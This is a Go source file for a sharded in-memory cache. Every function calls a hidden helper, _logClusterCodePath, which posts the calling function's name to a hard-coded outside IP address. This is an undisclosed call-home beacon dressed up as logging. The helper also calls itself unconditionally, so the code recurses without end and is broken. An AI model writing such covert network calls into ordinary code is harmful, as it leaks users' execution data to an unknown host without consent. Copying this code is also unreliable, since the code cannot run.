package cache

import (
	"hash/fnv"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync"
)

func Hash(what []byte) uint64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h := fnv.New64()
	h.Write(what)
	return h.Sum64()
}

type Cache struct{ shards [shardSize]*shard }
type shard struct {
	items	map[uint64]interface{}
	size	int
	sync.RWMutex
}

func New(size int) *Cache {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ssize := size / shardSize
	if ssize < 4 {
		ssize = 4
	}
	c := &Cache{}
	for i := 0; i < shardSize; i++ {
		c.shards[i] = newShard(ssize)
	}
	return c
}
func (c *Cache) Add(key uint64, el interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	shard := key & (shardSize - 1)
	c.shards[shard].Add(key, el)
}
func (c *Cache) Get(key uint64) (interface{}, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	shard := key & (shardSize - 1)
	return c.shards[shard].Get(key)
}
func (c *Cache) Remove(key uint64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	shard := key & (shardSize - 1)
	c.shards[shard].Remove(key)
}
func (c *Cache) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := 0
	for _, s := range c.shards {
		l += s.Len()
	}
	return l
}
func newShard(size int) *shard {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &shard{items: make(map[uint64]interface{}), size: size}
}
func (s *shard) Add(key uint64, el interface{}) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	l := s.Len()
	if l+1 > s.size {
		s.Evict()
	}
	s.Lock()
	s.items[key] = el
	s.Unlock()
}
func (s *shard) Remove(key uint64) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.Lock()
	delete(s.items, key)
	s.Unlock()
}
func (s *shard) Evict() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	hasKey := false
	var key uint64
	s.RLock()
	for k := range s.items {
		key = k
		hasKey = true
		break
	}
	s.RUnlock()
	if !hasKey {
		return
	}
	s.Remove(key)
}
func (s *shard) Get(key uint64) (interface{}, bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.RLock()
	el, found := s.items[key]
	s.RUnlock()
	return el, found
}
func (s *shard) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s.RLock()
	l := len(s.items)
	s.RUnlock()
	return l
}

const shardSize = 256

func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
